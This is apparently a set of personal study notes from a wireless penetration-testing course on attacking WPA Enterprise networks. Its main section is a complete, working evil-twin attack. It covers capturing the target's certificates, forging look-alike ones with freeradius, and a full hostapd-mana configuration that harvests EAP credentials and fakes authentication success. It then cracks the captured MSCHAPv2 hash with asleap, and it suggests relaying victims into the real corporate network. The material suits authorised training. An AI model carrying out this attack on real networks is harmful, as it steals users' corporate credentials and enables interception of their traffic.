---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 12: Attacking WPA Enterprise

## Basics

_Uses Extensible Authentication Protocol (EAP) and Remote Authentication Dial-In User Service (RADIUS) for authentication. Older (deprecated) methods of EAP don't require certificates, newer do._&#x20;

_Commonly used EAP methods on Wi-Fi networks:_

* _EAP Transport Layer Security (EAP-TLS): Uses a certificate on the server and client side, instead of username/password._
* _EAP Tunneled Transport Layer Security (EAP-TTLS): Doesn't necessarily need client certificates. It creates a tunnel and exchanges the credentials using one of the few possible different inner methods (also called **phase 2**) such as Challenge-Handshake Authentication Protocol (CHAP), Authentication Protocol (PAP), Microsoft CHAP (MS-CAHP), or MS-CHAPv2._
* _Protected EAP (PEAP) also creates a TLS tunnel before credentials are exchanged. Different methods can be used. MS-CHAPv2 is a commonly used inner method._

## PEAP Exchange

_Just walking through a PEAP exchange._

## Attack

Gathering information on our target AP (SSID Playtronics):

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo airodump-ng wlan0mon

...

CH  2 ][ Elapsed: 30 s ][ 1992-09-11 13:37 ][

 BSSID              PWR Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 FC:EC:DA:8F:2E:90  -40     639       19    1   2  300. WPA2 CCMP   MGT  Playtronics
 00:AB:E7:ED:E9:69  -84     104        0    0   11 54e.  WPA2 CCMP   PSK  whistler
 00:C7:0F:78:6D:2E  -84     104        0    0   7  54e.  WPA2 CCMP   PSK  mother
 04:53:45:60:34:52  -84     104        0    0   5  54e.  WPA2 CCMP   PSK  arbogast

 BSSID              STATION            PWR   Rate    Lost  Packets  Probes

 04:53:45:60:34:52  0D:09:6C:60:43:54  -69    0 - 1      0       35  FederalReserve, ATC, CoolidgeInstitute, CenturionBank
 FC:EC:DA:8F:2E:90  00:DC:FE:82:EF:06  -26   54 -54      0       31  Playtronics
```
{% endcode %}

Checking the validity of a certificate:

```bash
kali@kali:~$ openssl x509 -in certificate.pem -noout -enddate
```

Restart the dump, writing to disk:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo airodump-ng -w Playtronics --essid Playtronics --bssid FC:EC:DA:8F:2E:90 -c 2 wlan0mon
```
{% endcode %}

Disable the monitor mode once we capture the handshake:

```bash
kali@kali:~$ sudo airmon-ng stop wlan0mon
```

Open the capture in Wireshark, filtering for **tls.handshake.certificate**:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

In the **Packet Details**, locate _Extensible Authentication Protocol > Transport Layer Security > TLSv1 Record Layer: Handshake Protocol: Certificate > Handshake Protocol: Certificate > Certificates_ to find each certificate. Right click each certificate and select _Export Packet Bytes_ to save the data into a file with a **.der** extension.&#x20;

These certificates, in binary form, can be opened in the file manager or we can display information about them using OpenSSL:

{% code overflow="wrap" %}
```bash
kali@kali:~$ openssl x509 -inform der -in certificate.der -text
```
{% endcode %}

Optionally, convert the file to **.pem**:

{% code overflow="wrap" %}
```bash
kali@kali:~$ openssl x509 -inform der -in certificate.der -outform pem -out OUTPUT_PEM.crt
```
{% endcode %}

Installing _freeradius_, an open soruce RADIUS server. We'll use its scripts to generate certificates that look similar to the ones we received:

```bash
kali@kali:~$ sudo apt install freeradius
```

Modifying **/etc/freeradius/3.0/certs/ca.cnf** to match our target CA certificate so it looks less suspicious to clients if they inspect it:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo -s
root@kali:/home/kali# cd /etc/freeradius/3.0/certs
root@kali:/etc/freeradius/3.0/certs# nano ca.cnf

...
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
...

```
{% endcode %}

Updating the server information for the same reason:

{% code overflow="wrap" %}
```bash
root@kali:/etc/freeradius/3.0/certs# nano server.cnf

...
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"
...
```
{% endcode %}

Building the certificates. First regenerate **dh** with a 2048 bit key:

```bash
root@kali:/etc/freeradius/3.0/certs# rm dh

root@kali:/etc/freeradius/3.0/certs# make
openssl dhparam -out dh -2 2048
Generating DH parameters, 2048 bit long safe prime, generator 2
This is going to take a long time
...............+.....................................................................................+.......+......................................
....................................................................+..............................................................................++*++*++*++*
openssl req -new  -out server.csr -keyout server.key -config ./server.cnf
Generating a RSA private key
.......+++++
......................................................+++++
writing new private key to 'server.key'
-----
chmod g+r server.key
openssl req -new -x509 -keyout ca.key -out ca.pem \
        -days '60' -config ./ca.cnf \
        -passin pass:'whatever' -passout pass:'whatever'
Generating a RSA private key
............................+++++
........+++++
writing new private key to 'ca.key'
-----
chmod g+r ca.key
openssl ca -batch -keyfile ca.key -cert ca.pem -in server.csr  -key 'whatever' -out server.crt -extensions xpserver_ext -extfile xpextensions -config ./server.cnf
Using configuration from ./server.cnf
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: 1 (0x1)
        Validity
            Not Before: Jul 15 23:54:46 1992 GMT
            Not After : Sep 13 23:54:46 1992 GMT
        Subject:
            countryName               = US
            stateOrProvinceName       = CA
            organizationName          = Playtronics
            commonName                = Playtronics
            emailAddress              = admin@playtronics.com
        X509v3 extensions:
            X509v3 Extended Key Usage:
                TLS Web Server Authentication
            X509v3 CRL Distribution Points:

                Full Name:
                  URI:http://www.example.com/example_ca.crl

            X509v3 Certificate Policies:
                Policy: 1.3.6.1.4.1.40808.1.3.2

Certificate is to be certified until Sep 13 23:54:46 1992 GMT (60 days)

Write out database with 1 new entries
Data Base Updated
openssl pkcs12 -export -in server.crt -inkey server.key -out server.p12  -passin pass:'whatever' -passout pass:'whatever'
chmod g+r server.p12
openssl pkcs12 -in server.p12 -out server.pem -passin pass:'whatever' -passout pass:'whatever'
chmod g+r server.pem
server.pem: OK
openssl x509 -inform PEM -outform DER -in ca.pem -out ca.der
openssl ca -gencrl -keyfile ca.key -cert ca.pem -config ./ca.cnf -out ca-crl.pem -key 'whatever'
Using configuration from ./ca.cnf
openssl crl -in ca-crl.pem -outform der -out ca.crl
rm ca-crl.pem
openssl req -new  -out client.csr -keyout client.key -config ./client.cnf
Generating a RSA private key
.....................................+++++
.+++++
writing new private key to 'client.key'
-----
chmod g+r client.key
openssl ca -batch -keyfile ca.key -cert ca.pem -in client.csr  -key 'whatever' -out client.crt -extensions xpclient_ext -extfile xpextensions -config ./client.cnf
Using configuration from ./client.cnf
Check that the request matches the signature
Signature ok
The organizationName field is different between
CA certificate (Setec Astronomy) and the request (Example Inc.)
make: *** [Makefile:120: client.crt] Error 1
```

{% hint style="info" %}
If we run make but the certificates already exist, we will not be able to overwrite them. We have to run make destroycerts to clean up first.
{% endhint %}

Updating hostapd's mana config with our certificates:

```bash
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

Creating the EAP user file at **/etc/hostapd-mana/mana.eap\_user** as referenced in our previous file:

{% code overflow="wrap" %}
```bash
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```
{% endcode %}

**hostapd.eap\_user** format:

* The first column indicates a specific user by username or, in the event of wildcard character (\*), any user. It can contain a domain name as well.
* The second column contains the protocols allowed for the specific users and authentication phase.
* The third one is optional and is used for the password when a specific user is mentioned.
* The fourth one, indicated here with **\[2]**, indicates that the settings on this line are for phase 2 authentication.

Starting hostapd-mana with the configuration file we created:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo hostapd-mana /etc/hostapd-mana/mana.conf
Configuration file: mana.conf
MANA: Captured credentials will be written to file '/tmp/hostapd.credout'.
Using interface wlan0 with hwaddr 16:93:8a:98:ec:4f and ssid "Playtronics"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
```
{% endcode %}

Example output of a user connecting to our AP:

{% code overflow="wrap" %}
```bash
...
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: authenticated
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: associated (aid 1)
wlan0: CTRL-EVENT-EAP-STARTED 00:2b:bb:b0:42:9e
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: cosmo
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: cosmo
MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
...
```
{% endcode %}

Using asleap to crack the password hash, using the output captured in hostapd-mana or by referencing **/tmp/hostapd.credout**:

{% code overflow="wrap" %}
```bash
kali@kali:~$ asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
Using wordlist mode with "/usr/share/john/password.lst".
        hash bytes:        586c
        NT hash:           8846f7eaee8fb117ad06bdd830b7586c
        password:          password
```
{% endcode %}

{% hint style="info" %}
**crackapd** can be used to automatically run **asleap** when it sees credentials in teh log file. If successful, it adds the user to hostapd **eap\_user** file, allowing the user to successfully connect to our rogue AP.

We could also provide internet access by adding a DHCP server and a few nftables rules to enable routing.

We could _also_ push the attack further by authenticating to the real AP ourselves, providing our _clients_ access to the actual company network as well.
{% endhint %}
